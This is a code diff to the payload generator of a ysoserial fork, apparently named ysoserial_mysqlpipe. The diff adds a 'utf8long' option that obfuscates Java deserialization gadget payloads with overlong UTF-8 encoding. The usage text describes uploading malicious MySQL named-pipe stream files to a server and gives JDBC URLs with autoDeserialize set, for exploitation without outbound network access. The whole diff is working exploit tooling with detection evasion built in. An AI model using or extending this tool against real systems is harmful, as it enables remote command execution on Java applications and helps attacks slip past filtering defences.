@@ -26,13 +26,25 @@ public class GeneratePayload {
     public static void main(final String[] args) throws Exception {
         Logger rootLogger = (Logger) LoggerFactory.getLogger(Logger.ROOT_LOGGER_NAME);
         rootLogger.setLevel(Level.OFF); // 设置为 OFF 级别
-        if (args.length != 3) {
+
+        boolean utf8LongEnabled = false;
+        String[] actualArgs = args;
+
+        // 检查是否包含 utf8long 参数
+        if (args.length > 0 && "utf8long".equals(args[0])) {
+            utf8LongEnabled = true;
+            // 创建一个新的数组，去掉第一个参数
+            actualArgs = new String[args.length - 1];
+            System.arraycopy(args, 1, actualArgs, 0, args.length - 1);
+        }
+
+        if (actualArgs.length != 3) {
             printUsage();
             System.exit(USAGE_CODE);
         }
-        final String model = args[0];
-        final String payloadType = args[1];
-        final String command = args[2];
+        final String model = actualArgs[0];
+        final String payloadType = actualArgs[1];
+        final String command = actualArgs[2];
 
         if (model.equals("gadget")) {
             final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
@@ -46,8 +58,19 @@ public class GeneratePayload {
             try {
                 final ObjectPayload payload = payloadClass.newInstance();
                 final Object object = payload.getObject(command);
+                byte[] resultBytes = Serializer.serialize(object);
+
+                // Check if utf8long option is enabled
+                if (utf8LongEnabled) {
+                    resultBytes = SerializationObfuscator.builder(resultBytes)
+                        .withType(1) // 使用纯3字节编码
+                        .build();
+                }
+
                 PrintStream out = System.out;
-                Serializer.serialize(object, out);
+                out.write(resultBytes);
+                out.flush();
+
                 Utils.releasePayload(payload, object);
             } catch (Throwable e) {
                 System.err.println("Error while generating or serializing payload");
@@ -96,7 +119,13 @@ public class GeneratePayload {
                     out.flush();
                     System.exit(0);
             }
-            object = fakeMySQLPipeFile.getObject(build(payloadType, command));
+            byte[] resultBytes = build(payloadType, command);
+            if (utf8LongEnabled) {
+                resultBytes = SerializationObfuscator.builder(resultBytes)
+                    .withType(1) // 使用纯3字节编码
+                    .build();
+            }
+            object = fakeMySQLPipeFile.getObject(resultBytes);
             PrintStream out = System.out;
             out.write(object);
             out.flush();
@@ -130,7 +159,8 @@ public class GeneratePayload {
 
     private static void printUsage() {
         System.err.println("Y SO SERIAL_mysqlpipe ?");
-        System.err.println("Usage: java -jar ysoserial_mysqlpipe-[version]-all.jar [mode] [payload] '[command]'");
+        System.err.println("Usage: java -jar ysoserial_mysqlpipe-[version]-all.jar [utf8long] [mode] [payload] '[command]'");
+        System.err.println("       utf8long: 可选参数，添加此参数可启用UTF-8长编码功能");
         System.err.println("[mode]: [gadget]/[mysqlpipe]_[version]_(user) ");
         System.err.println("提供mysql的pipe恶意流文件，上传服务器，进行不出网利用,数据库为test,用户名默认mysql,可自己设置。\n"+
             "mysql5: jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=output.pcap\n"+
